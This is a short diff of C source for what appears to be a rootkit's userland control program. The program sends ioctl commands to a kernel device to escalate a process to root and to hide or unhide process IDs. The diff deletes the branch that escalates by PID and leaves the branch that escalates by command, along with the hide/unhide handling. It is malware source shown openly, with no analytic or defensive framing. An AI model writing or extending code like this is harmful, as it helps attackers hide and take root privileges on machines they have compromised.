@@ -82,14 +82,6 @@ int main(int argc, char *argv[])
         else
             printf("PID %lu unhidden\n", args.target);
 
-    } else if (strcmp(argv[1], "privesc_pid") == 0 && argc >= 3) {
-        args.target = strtoul(argv[2], NULL, 10);
-        args.value = RK_PRIVESC_BY_PID;
-        if (ioctl(fd, RK_CMD_PRIVESC, &args) < 0)
-            perror("ioctl PRIVESC");
-        else
-            printf("PID %lu escalated to root\n", args.target);
-
     } else if (strcmp(argv[1], "privesc_cmd") == 0 && argc >= 3) {
         args.target = (unsigned long)argv[2];
         args.value = RK_PRIVESC_BY_CMD;
